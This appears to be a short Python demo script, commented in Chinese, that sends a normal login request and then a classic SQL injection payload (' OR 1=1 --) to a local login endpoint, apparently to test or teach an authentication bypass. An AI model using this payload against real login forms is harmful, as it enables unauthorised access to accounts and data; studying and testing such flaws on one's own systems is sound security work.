import requests

# 正常登录
response = requests.post('http://localhost:5000/login', data={'username': 'admin', 'password': 'password'})
print("Normal login:", response.json())

# SQL 注入
response = requests.post('http://localhost:5000/login', data={'username': "' OR 1=1 --", 'password': 'anything'})
print("SQL injection:", response.json())